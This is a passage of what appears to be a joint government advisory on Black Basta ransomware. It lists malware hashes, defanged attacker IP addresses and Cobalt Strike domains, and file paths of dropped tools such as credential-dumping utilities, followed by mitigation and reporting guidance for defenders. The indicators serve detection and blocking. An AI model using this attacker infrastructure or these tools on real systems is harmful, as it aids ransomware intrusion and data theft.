<td>86a4dd6be867846b251460d2a0874e6413589878d27f2c4482b54cec134cc737</td>
<td>DLL</td>
</tr>
<tr>
<td>07117c02a09410f47a326b52c7f17407e63ba5e6ff97277446efc75b862d2799</td>
<td>DLL</td>
</tr>
<tr>
<td>96339a7e87ffce6ced247feb9b4cb7c05b83ca315976a9522155bad726b8e5be</td>
<td><a>ELF</a></td>
</tr>
<tr>
<td>1c1b2d7f790750d60a14bd661dae5c5565f00c6ca7d03d062adcecda807e1779</td>
<td>ELF</td>
</tr>
<tr>
<td>360c9c8f0a62010d455f35588ef27817ad35c715a5f291e43449ce6cb1986b98</td>
<td>ELF</td>
</tr>
<tr>
<td>0554eb2ffa3582b000d558b6950ec60e876f1259c41acff2eac47ab78a53e94a</td>
<td><a>EXE</a></td>
</tr>
<tr>
<td>9a55f55886285eef7ffabdd55c0232d1458175b1d868c03d3e304ce7d98980bc</td>
<td>EXE</td>
</tr>
<tr>
<td>62e63388953bb30669b403867a3ac2c8130332cf78133f7fd4a7f23cdc939087</td>
<td>EXE</td>
</tr>
<tr>
<td>7ad4324ea241782ea859af12094f89f9a182236542627e95b6416c8fb9757c59</td>
<td>EXE</td>
</tr>
<tr>
<td>350ba7fca67721c74385faff083914ecdd66ef107a765dfb7ac08b38d5c9c0bd</td>
<td>EXE</td>
</tr>
<tr>
<td>90ba27750a04d1308115fa6a90f36503398a8f528c974c5adc07ae8a6cd630e7</td>
<td>EXE</td>
</tr>
<tr>
<td>fafaff3d665b26b5c057e64b4238980589deb0dff0501497ac50be1bc91b3e08</td>
<td>EXE</td>
</tr>
<tr>
<td>acb60f0dd19a9a26aaaefd3326db8c28f546b6b0182ed2dcc23170bcb0af6d8f</td>
<td>EXE</td>
</tr>
<tr>
<td>d73f6e240766ddd6c3c16eff8db50794ab8ab95c6a616d4ab2bc96780f13464d</td>
<td>EXE</td>
</tr>
<tr>
<td>f039eaaced72618eaba699d2985f9e10d252ac5fe85d609c217b45bc8c3614f4</td>
<td>EXE</td>
</tr>
<tr>
<td>723d1cf3d74fb3ce95a77ed9dff257a78c8af8e67a82963230dd073781074224</td>
<td>EXE</td>
</tr>
<tr>
<td>ae7c868713e1d02b4db60128c651eb1e3f6a33c02544cc4cb57c3aa6c6581b6e</td>
<td>EXE</td>
</tr>
<tr>
<td>fff35c2da67eef6f1a10c585b427ac32e7f06f4e4460542207abcd62264e435f</td>
<td>EXE</td>
</tr>
<tr>
<td>df5b004be71717362e6b1ad22072f9ee4113b95b5d78c496a90857977a9fb415</td>
<td>EXE</td>
</tr>
<tr>
<td>462bbb8fd7be98129aa73efa91e2d88fa9cafc7b47431b8227d1957f5d0c8ba7</td>
<td>EXE</td>
</tr>
<tr>
<td>3c50f6369f0938f42d47db29a1f398e754acb2a8d96fd4b366246ac2ccbe250a</td>
<td>EXE</td>
</tr>
<tr>
<td>5d2204f3a20e163120f52a2e3595db19890050b2faa96c6cba6b094b0a52b0aa</td>
<td>EXE</td>
</tr>
<tr>
<td>37a5cd265f7f555f2fe320a68d70553b7aa9601981212921d1ac2c114e662004</td>
<td>EXE</td>
</tr>
<tr>
<td>3090a37e591554d7406107df87b3dc21bda059df0bc66244e8abef6a5678af35</td>
<td>EXE</td>
</tr>
<tr>
<td>17879ed48c2a2e324d4f5175112f51b75f4a8ab100b8833c82e6ddb7cd817f20</td>
<td>EXE</td>
</tr>
<tr>
<td>42f05f5d4a2617b7ae0bc601dd6c053bf974f9a337a8fcc51f9338b108811b78</td>
<td>EXE</td>
</tr>
<tr>
<td>882019d1024778e13841db975d5e60aaae1482fcf86ba669e819a68ce980d7d3</td>
<td>EXE</td>
</tr>
<tr>
<td>e28188e516db1bda9015c30de59a2e91996b67c2e2b44989a6b0f562577fd757</td>
<td>EXE</td>
</tr>
<tr>
<td>0a8297b274aeab986d6336b395b39b3af1bb00464cf5735d1ecdb506fef9098e</td>
<td>EXE</td>
</tr>
<tr>
<td>69192821f8ce4561cf9c9cb494a133584179116cb2e7409bea3e18901a1ca944</td>
<td>EXE</td>
</tr>
<tr>
<td>3337a7a9ccdd06acdd6e3cf4af40d871172d0a0e96fc48787b574ac93689622a</td>
<td>EXE</td>
</tr>
<tr>
<td>17205c43189c22dfcb278f5cc45c2562f622b0b6280dcd43cc1d3c274095eb90</td>
<td>EXE</td>
</tr>
<tr>
<td>b32daf27aa392d26bdf5faafbaae6b21cd6c918d461ff59f548a73d447a96dd9</td>
<td>EXE</td>
</tr>
</tbody>
</table>
<p>See Tables 8–11 for IOCs obtained from trusted third-party reporting.</p>
<p><strong>Disclaimer:</strong> The authoring organizations recommend network defenders investigate or vet IP addresses prior to taking action, such as blocking, as many cyber actors are known to change IP addresses, sometimes daily, and some IP addresses may host valid domains.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8: Network Indicators</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>IP Address</strong></th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>66.249.66[.]18</td>
<td>0gpw.588027fa.dns.realbumblebee[.]net, dns.trailshop[.]net, dns.artspathgroupe[.]net</td>
</tr>
<tr>
<td>66.249.66[.]18</td>
<td>my.2a91c002002.588027fa.dns.realbumblebee[.]net</td>
</tr>
<tr>
<td>66.249.66[.]18</td>
<td>fy9.39d9030e5d3a8e2352daae2f4cd3c417b36f64c6644a783b9629147a1.afd8b8a4615358e0313bad8c544a1af0d8efcec0e8056c2c8eee96c7.b06d1825c0247387e38851b06be0272b0bd619b7c9636bc17b09aa70.a46890f27.588027fa.dns.realbumblebee[.]net</td>
</tr>
<tr>
<td>95.181.173[.]227</td>
<td>adslsdfdsfmo[.]world</td>
</tr>
<tr>
<td>&nbsp;</td>
<td>fy9.36c44903529fa273afff3c9b7ef323432e223d22ae1d625c4a3957d57.015c16eff32356bf566c4fd3590c6ff9b2f6e8c587444ecbfc4bcae7.f71995aff9e6f22f8daffe9d2ad9050abc928b8f93bb0d42682fd3c3.445de2118.588027fa.dns.realbumblebee[.]net</td>
</tr>
<tr>
<td>207.126.152[.]242</td>
<td>xkpal.d6597fa.dns.blocktoday.net<br>nuher.3577125d2a75f6a277fc5714ff536c5c6af5283d928a66daad6825b9a.7aaf8bba88534e88ec89251c57b01b322c7f52c7f1a5338930ae2a50.cbb47411f60fe58f76cf79d300c03bdecfb9e83379f59d80b8494951.e10c20f77.7fcc0eb6.dns.blocktoday[.]net</td>
</tr>
<tr>
<td>72.14.196[.]50</td>
<td>.rasapool[.]net, dns.trailshop[.]net</td>
</tr>
<tr>
<td>72.14.196[.]192</td>
<td>.rasapool[.]net</td>
</tr>
<tr>
<td>72.14.196[.]2</td>
<td>.rasapool[.]net</td>
</tr>
<tr>
<td>72.14.196[.]226</td>
<td>.rasapool[.]net</td>
</tr>
<tr>
<td>46.161.27[.]151</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>207.126.152[.]242</td>
<td>nuher.1d67bbcf4.456d87aa6.2d84dfba.dns.specialdrills[.]com</td>
</tr>
<tr>
<td>185.219.221[.]136</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>64.176.219[.]106</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>5.78.115[.]67</td>
<td>your-server[.]de</td>
</tr>
<tr>
<td>207.126.152[.]242</td>
<td>xkpal.1a4a64b6.dns.blocktoday[.]net</td>
</tr>
<tr>
<td>46.8.16[.]77</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>185.7.214[.]79</td>
<td>VPN Server</td>
</tr>
<tr>
<td>185.220.100[.]240</td>
<td>Tor exit</td>
</tr>
<tr>
<td>107.189.30[.]69</td>
<td>Tor exit</td>
</tr>
<tr>
<td>5.183.130[.]92</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>185.220.101[.]149</td>
<td>Tor exit</td>
</tr>
<tr>
<td>188.130.218[.]39</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>188.130.137[.]181</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>46.8.10[.]134</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>155.138.246[.]122</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>80.239.207[.]200</td>
<td>winklen[.]ch</td>
</tr>
<tr>
<td>183.181.86[.]147</td>
<td>Xserver[.]jp</td>
</tr>
<tr>
<td>34.149.120[.]3</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>104.21.40[.]72</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>34.250.161[.]149</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>88.198.198[.]90</td>
<td>your-server[.]de; literoved[.]ru</td>
</tr>
<tr>
<td>35.244.153[.]44</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>35.212.86[.]55</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>34.251.163[.]236</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>34.160.81[.]203</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>34.149.36[.]179</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>104.21.26[.]145</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>83.243.40[.]10</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>35.227.194[.]51</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>35.190.31[.]54</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>34.120.190[.]48</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>116.203.186[.]178</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>34.160.17[.]71</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9: File Indicators</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Filename</strong></th>
<th role=\"columnheader\"><strong>Hash</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>C:\\Users\\Public\\Audio\\Jun.exe</td>
<td>b6a4f4097367d9c124f51154d8750ea036a812d5badde0baf9c5f183bb53dd24</td>
</tr>
<tr>
<td>C:\\Users\\Public\\Audio\\esx.zip</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\Audio\\7zG.exe</td>
<td>f21240e0bf9f0a391d514e34d4fa24ecb997d939379d2260ebce7c693e55f061</td>
</tr>
<tr>
<td>C:\\Users\\Public\\Audio\\7z.dll</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\db_Usr.sql</td>
<td>8501e14ee6ee142122746333b936c9ab0fc541328f37b5612b6804e6cdc2c2c6</td>
</tr>
<tr>
<td>C:\\Users\\Public\\Audio\\db_Usr.sql</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\Audio\\hv2.ps1</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\7zG.exe</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\7z.dll</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\BitLogic.dll</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\NetApp.exe</td>
<td>4c897334e6391e7a2fa3cbcbf773d5a4</td>
</tr>
<tr>
<td>C:\\Users\\Public\\DataSoft.exe</td>
<td>2642ec377c0cee3235571832cb472870</td>
</tr>
<tr>
<td>C:\\Users\\Public\\BitData.exe</td>
<td>b3fe23dd4701ed00d79c03043b0b952e</td>
</tr>
<tr>
<td>C:\\Users\\Public\\DigitalText.dll</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\GeniusMesh.exe</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>\\Device\\Mup\\{redacted}\\C$\\Users\\Public\\Music\\PROCEXP.sys</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>\\Device\\Mup\\{redacted}\\C$\\Users\\Public\\Music\\DumpNParse86.exe</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>\\Device\\Mup\\{redacted}\\C$\\Users\\Public\\Music\\POSTDump.exe</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>\\Device\\Mup\\{redacted}\\C$\\Users\\Public\\Music\\DumpNParse.exe</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\socksps.ps1</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\Thief.exe</td>
<td>034b5fe047920b2ae9493451623633b14a85176f5eea0c7aadc110ea1730ee79</td>
</tr>
<tr>
<td>
<p>C:\\Users\\All Users\\{redacted}\\GWT.ps1</p>
<p>C:\\Program Files\\MonitorIT\\GWT.ps1</p>
</td>
<td>8C68B2A794BA3D148CAE91BDF9C8D357289752A94118B5558418A36D95A5A45F</td>
</tr>
<tr>
<td>
<p>Winx86.exe&nbsp;</p>
<p><strong>Comment:</strong> alias for cmd.exe</p>
</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\eucr.exe</td>
<td>3c65da7f7bfdaf9acc6445abbedd9c4e927d37bb9e3629f34afc338058680407</td>
</tr>
<tr>
<td>C:\\Windows\\DS_c1.dll</td>
<td>808c96cb90b7de7792a827c6946ff48123802959635a23bf9d98478ae6a259f9</td>
</tr>
<tr>
<td>C:\\Windows\\DS_c1.dll</td>
<td>3a8fc07cadc08eeb8be342452636a754158403c3d4ebff379a4ae66f8298d9a6</td>
</tr>
<tr>
<td>C:\\Windows\\DS_c1.dll</td>
<td>4ac69411ed124da06ad66ee8bfbcea2f593b5b199a2c38496e1ee24f9d04f34a</td>
</tr>
<tr>
<td>C:\\Windows\\DS_c1.dll</td>
<td>819cb9bcf62be7666db5666a693524070b0df589c58309b067191b30480b0c3a</td>
</tr>
<tr>
<td>C:\\Windows\\DS_c1.dll</td>
<td>c26a5cb62a78c467cc6b6867c7093fbb7b1a96d92121d4d6c3f0557ef9c881e0</td>
</tr>
<tr>
<td>C:\\Windows\\DS_c1.dll</td>
<td>d503090431fdd99c9df3451d9b73c5737c79eda6eb80c148b8dc71e84623401f</td>
</tr>
<tr>
<td>*\\instructions_read_me.txt</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10: Known Black Basta Cobalt Strike Domains</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Domain</strong></th>
<th role=\"columnheader\"><strong>Date/Time (UTC)/Time (UTC)</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>trailshop[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>realbumblebee[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>recentbee[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>investrealtydom[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>webnubee[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>artspathgroup[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>buyblocknow[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>currentbee[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>modernbeem[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>startupbusiness24[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>magentoengineers[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>childrensdolls[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>myfinancialexperts[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>limitedtoday[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>kekeoamigo[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>nebraska-lawyers[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>tomlawcenter[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>thesmartcloudusa[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>rasapool[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>artspathgroupe[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>specialdrills[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>thetrailbig[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>consulheartinc[.]com</td>
<td>3/22/2024 15:35</td>
</tr>
<tr>
<td>otxcosmeticscare[.]com</td>
<td>3/15/2024 10:14</td>
</tr>
<tr>
<td>otxcarecosmetics[.]com</td>
<td>3/15/2024 10:14</td>
</tr>
<tr>
<td>artstrailman[.]com</td>
<td>3/15/2024 10:14</td>
</tr>
<tr>
<td>ontexcare[.]com</td>
<td>3/15/2024 10:14</td>
</tr>
<tr>
<td>trackgroup[.]net</td>
<td>3/15/2024 10:14</td>
</tr>
<tr>
<td>businessprofessionalllc[.]com</td>
<td>3/15/2024 10:14</td>
</tr>
<tr>
<td>securecloudmanage[.]com</td>
<td>3/7/2024 10:42</td>
</tr>
<tr>
<td>oneblackwood[.]com</td>
<td>3/7/2024 10:42</td>
</tr>
<tr>
<td>buygreenstudio[.]com</td>
<td>3/7/2024 10:42</td>
</tr>
<tr>
<td>startupbuss[.]com</td>
<td>3/7/2024 10:42</td>
</tr>
<tr>
<td>onedogsclub[.]com</td>
<td>3/4/2024 18:26</td>
</tr>
<tr>
<td>wipresolutions[.]com</td>
<td>3/4/2024 18:26</td>
</tr>
<tr>
<td>recentbeelive[.]com</td>
<td>3/4/2024 18:26</td>
</tr>
<tr>
<td>trailcocompany[.]com</td>
<td>3/4/2024 18:26</td>
</tr>
<tr>
<td>trailcosolutions[.]com</td>
<td>3/4/2024 18:26</td>
</tr>
<tr>
<td>artstrailreviews[.]com</td>
<td>3/4/2024 18:26</td>
</tr>
<tr>
<td>usaglobalnews[.]com</td>
<td>2/15/2024 5:56</td>
</tr>
<tr>
<td>topglobaltv[.]com</td>
<td>2/15/2024 5:56</td>
</tr>
<tr>
<td>startupmartec[.]net</td>
<td>2/15/2024 5:56</td>
</tr>
<tr>
<td>technologgies[.]com</td>
<td>1/2/2024 18:16</td>
</tr>
<tr>
<td>jenshol[.]com</td>
<td>1/2/2024 18:16</td>
</tr>
<tr>
<td>simorten[.]com</td>
<td>1/2/2024 18:16</td>
</tr>
<tr>
<td>investmentgblog[.]net</td>
<td><a>1/2/2024 18:16</a></td>
</tr>
<tr>
<td>protectionek[.]com</td>
<td>1/2/2024 18:16</td>
</tr>
</tbody>
</table>
<table>
<caption><em>Table 11: Suspected Black Basta Domains</em></caption>
<tbody>
<tr>
<td>airbusco[.]net</td>
</tr>
<tr>
<td>allcompanycenter[.]com</td>
</tr>
<tr>
<td>animalsfast[.]net</td>
</tr>
<tr>
<td>audsystemecll[.]net</td>
</tr>
<tr>
<td>auuditoe[.]com</td>
</tr>
<tr>
<td>bluenetworking[.]net</td>
</tr>
<tr>
<td>brendonline[.]com</td>
</tr>
<tr>
<td>businesforhome[.]com</td>
</tr>
<tr>
<td>caspercan[.]com</td>
</tr>
<tr>
<td>clearsystemwo[.]net</td>
</tr>
<tr>
<td>cloudworldst[.]net</td>
</tr>
<tr>
<td>constrtionfirst[.]com</td>
</tr>
<tr>
<td>erihudeg[.]com</td>
</tr>
<tr>
<td>garbagemoval[.]com</td>
</tr>
<tr>
<td>gartenlofti[.]com</td>
</tr>
<tr>
<td>getfnewsolutions[.]com</td>
</tr>
<tr>
<td>getfnewssolutions[.]com</td>
</tr>
<tr>
<td>investmendvisor[.]net</td>
</tr>
<tr>
<td>investmentrealtyhp[.]net</td>
</tr>
<tr>
<td>ionoslaba[.]com</td>
</tr>
<tr>
<td>jessvisser[.]com</td>
</tr>
<tr>
<td>karmafisker[.]com</td>
</tr>
<tr>
<td>kolinileas[.]com</td>
</tr>
<tr>
<td>maluisepaul[.]com</td>
</tr>
<tr>
<td>masterunix[.]net</td>
</tr>
<tr>
<td>monitor-websystem[.]net</td>
</tr>
<tr>
<td>monitorsystem[.]net</td>
</tr>
<tr>
<td>mytrailinvest[.]net</td>
</tr>
<tr>
<td>prettyanimals[.]net</td>
</tr>
<tr>
<td>reelsysmoona[.]net</td>
</tr>
<tr>
<td>seohomee[.]com</td>
</tr>
<tr>
<td>septcntr[.]com</td>
</tr>
<tr>
<td>softradar[.]net</td>
</tr>
<tr>
<td>startupbizaud[.]net</td>
</tr>
<tr>
<td>startuptechnologyw[.]net</td>
</tr>
<tr>
<td>steamteamdev[.]net</td>
</tr>
<tr>
<td>stockinvestlab[.]net</td>
</tr>
<tr>
<td>taskthebox[.]net</td>
</tr>
<tr>
<td>trailgroupl[.]net</td>
</tr>
<tr>
<td>treeauwin[.]net</td>
</tr>
<tr>
<td>unitedfrom[.]com</td>
</tr>
<tr>
<td>unougn[.]com</td>
</tr>
<tr>
<td>wardeli[.]com</td>
</tr>
<tr>
<td>welausystem[.]net</td>
</tr>
<tr>
<td>wellsystemte[.]net</td>
</tr>
<tr>
<td>withclier[.]com</td>
</tr>
</tbody>
</table>
<h3><strong>MITIGATIONS</strong></h3>
<p>The authoring organizations recommend all critical infrastructure organizations implement the mitigations below to improve your organization’s cybersecurity posture based on Black Basta’s activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s&nbsp;<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<ul>
<li><strong>Install updates for operating systems, software, and firmware as soon as they are released</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MitigatingKnownVulnerabilities1E\" title=\"Mitigating Known Vulnerabilities (1.E)\">CPG 1.E</a>]. Prioritize updating <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">Known Exploited Vulnerabilities (KEV)</a>.</li>
<li><strong>Require phishing-resistant multi-factor authentication (MFA)</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#PhishingResistantMultifactorAuthenticationMFA2H\" title=\"Phishing-Resistant Multifactor Authentication (MFA) (2.H)\">CPG 2.H</a>] for as many services as possible.</li>
<li><strong>Implement recommendations, including training users to recognize and report phishing attempts&nbsp;</strong>[<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#BasicCybersecurityTraining2I\" title=\"Basic Cybersecurity Training (2.I)\">CPG 2.I</a>], from joint <a href=\"https://www.cisa.gov/resources-tools/resources/phishing-guidance-stopping-attack-cycle-phase-one\" title=\"Phishing Guidance: Stopping the Attack Cycle at Phase One\">Phishing Guidance: Stopping the Attack Cycle at Phase One</a>.</li>
<li><strong>Secure remote access software</strong> by applying mitigations from joint <a href=\"https://www.cisa.gov/resources-tools/resources/guide-securing-remote-access-software\" title=\"Guide to Securing Remote Access Software\">Guide to Securing Remote Access Software</a>.</li>
<li><strong>Make backups of critical systems and device configurations</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SystemBackups2R\" title=\"System Backups (2.R)\">CPG 2.R</a>] to enable devices to be repaired and restored.</li>
<li><strong>Apply mitigations from the joint&nbsp;</strong><a href=\"https://www.cisa.gov/stopransomware/ransomware-guide\" title=\"#StopRansomware Guide\"><strong>#StopRansomware Guide</strong></a>.</li>
</ul>
<p>The authoring organizations also recommend network defenders of HPH Sector and other critical infrastructure organizations to reference CISA’s <a href=\"https://www.cisa.gov/resources-tools/resources/mitigation-guide-healthcare-and-public-health-hph-sector\" title=\"Mitigation Guide: Healthcare and Public Health (HPH) Sector\">Mitigation Guide: Healthcare and Public Health (HPH) Sector</a> and HHS’s <a href=\"https://hphcyber.hhs.gov/performance-goals.html\" title=\"HPH Cybersecurity Performance Goals\">HPH Cybersecurity Performance Goals</a>, which provide best practices to combat pervasive cyber threats against organizations. Recommendations include the following:</p>
<ul>
<li><strong>Asset Management and Security</strong>: Cybersecurity professionals should identify and understand all relationships or interdependencies, functionality of each asset, what it exposes, and what software is running to ensure critical data and systems are protected appropriately. HPH Sector organizations should ensure&nbsp;electronic PHI (ePHI) is protected and compliant with the Health Insurance Portability and Accountability Act (HIPAA). Organizations can complete asset inventories using active scans, passive processes, or a combination of both techniques.</li>
<li><strong>Email Security and Phishing Prevention</strong>: Organizations should install modern anti-malware software and automatically update signatures where possible. For additional guidance, see CISA’s <a href=\"https://www.cisa.gov/resources-tools/resources/enhance-email-web-security\" title=\"Enhance Email &amp; Web Security\">Enhance Email and Web Security Guide</a>.
<ul>
<li><strong>Check for embedded or spoofed hyperlinks</strong>: Validate the URL of the link matches the text of the link itself. This can be achieved by hovering your cursor over the link to view the URL of the website to be accessed.</li>
</ul>
</li>
<li><strong>Access Management</strong>: Phishing-resistant MFA completes the same process but removes ‘people’ from the equation to help thwart social engineering scams and targeted phishing attacks that may have been successful using traditional MFA. The two main forms of phishing-resistant MFA are FIDO/Web Authentication (WebAuthn) authentication and Public Key Infrastructure (PKI)-based authentication. Prioritize phishing-resistant MFA on accounts with the highest risk, such as privileged administrative accounts on key assets. For additional information on phishing-resistant MFA, see CISA’s <a href=\"https://www.cisa.gov/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf\" title=\"Implementing Phishing-Resistant MFA Guide\">Implementing Phishing-Resistant MFA Guide</a>.</li>
<li><strong>Vulnerability Management and Assessment</strong>: Once vulnerabilities are identified across your environment, evaluate and prioritize to appropriately deal with the posed risks according to your organization’s risk strategy. To assist with prioritization, it is essential to:
<ul>
<li><strong>Map your assets to business-critical functions.</strong> For vulnerability remediation, prioritize assets that are most critical for ongoing operations or which, if affected, could impact your organization’s business continuity, sensitive PII (or PHI) security, reputation, or financial position.</li>
<li><strong>Use threat intelligence information.</strong> For remediation, prioritize vulnerabilities actively exploited by threat actors. To assist, leverage CISA’s <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">KEV Catalog</a> and other threat intelligence feeds.</li>
<li><strong>Leverage prioritization methodologies, ratings, and scores</strong>. The Common Vulnerability Scoring System (CVSS) assesses the technical severity of vulnerabilities. The Exploit Prediction Scoring System (EPSS) measures the likelihood of exploitation and can help with deciding which vulnerabilities to prioritize. CISA’s <a href=\"https://www.cisa.gov/stakeholder-specific-vulnerability-categorization-ssvc\" title=\"Stakeholder-Specific Vulnerability Categorization (SSVC)\">Stakeholder-Specific Vulnerability Categorization (SSVC)</a> methodology leverages decision trees to prioritize relevant vulnerabilities into four decisions, Track, Track*, Attend, and Act based on exploitation status, technical impact, mission prevalence, and impacts to safety and public-wellbeing.</li>
</ul>
</li>
</ul>
<h3><strong>VALIDATE SECURITY CONTROLS</strong></h3>
<p>In addition to applying mitigations, the authoring organizations recommend exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The authoring organizations recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see Tables 2-6).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<p>The authoring organizations recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>
<h3><strong>REFERENCES</strong></h3>
<ol>
<li><a href=\"https://www.sentinelone.com/labs/black-basta-ransomware-attacks-deploy-custom-edr-evasion-tools-tied-to-fin7-threat-actor/\" title=\"Black Basta Ransomware | Attacks Deploy Custom EDR Evasion Tools Tied to FIN7 Threat Actor\">SentinelOne: Black Basta Ransomware | Attacks Deploy Custom EDR Evasion Tools Tied to FIN7 Threat Actor</a></li>
<li><a href=\"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-blackbasta\" title=\"Ransomware Spotlight - Black Basta\">Trend Micro: Ransomware Spotlight - Black Basta</a></li>
<li><a href=\"https://www.kroll.com/en/insights/publications/cyber/black-basta-technical-analysis\" title=\"Black Basta - Technical Analysis\">Kroll: Black Basta - Technical Analysis</a></li>
<li><a href=\"https://www.blackberry.com/us/en/solutions/endpoint-security/ransomware-protection/black-basta\" title=\"Who Is Black Basta?\">Who Is Black Basta? (blackberry.com)</a></li>
<li><a href=\"https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/\" title=\"Threat Assessment - Black Basta Ransomware\">Palo Alto Networks: Threat Assessment - Black Basta Ransomware</a></li>
</ol>
<h3><strong>REPORTING</strong></h3>
<p>Your organization has no obligation to respond or provide information back to FBI in response to this joint CSA. If, after reviewing the information provided, your organization decides to provide information to FBI, reporting must be consistent with applicable state and federal laws.</p>
<p>FBI is interested in any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with threat actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.</p>
